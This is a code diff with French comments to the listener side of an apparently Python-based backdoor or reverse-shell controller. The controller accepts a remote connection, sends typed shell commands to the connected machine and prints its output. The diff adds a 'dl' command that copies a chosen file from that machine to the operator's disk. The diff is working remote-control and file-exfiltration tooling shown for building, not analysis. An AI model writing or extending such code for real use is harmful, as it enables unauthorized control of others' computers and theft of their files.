@@ -54,6 +54,8 @@ print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
 connection_socket, client_address = s.accept()
 print(f"Connexion établie avec {client_address}")
 
+dl_file_name = None
+
 while True:
     infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
     if not infos_data:
@@ -68,13 +70,21 @@ while True:
 
     commande = input(client_address[0] + ":" + str(client_address[1]) + " " + cwd + " > ")
 
-    if commande == "":
-        continue
+    commande_split = commande.split(" ")
+    if len(commande_split) == 2 and commande_split[0] == "dl":
+        dl_file_name = commande_split[1]
 
     data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
     if not data_recues:
         break
-    print(data_recues)
+
+    if dl_file_name:
+        with open(dl_file_name, "wb") as f:
+            f.write(data_recues.encode())  # str -> bytes pour écrire en binaire
+        print(f"Fichier {dl_file_name} téléchargé avec succès.")
+        dl_file_name = None
+    else:
+        print(data_recues)  # déjà un str, pas besoin de .decode()
 
 s.close()
 connection_socket.close()
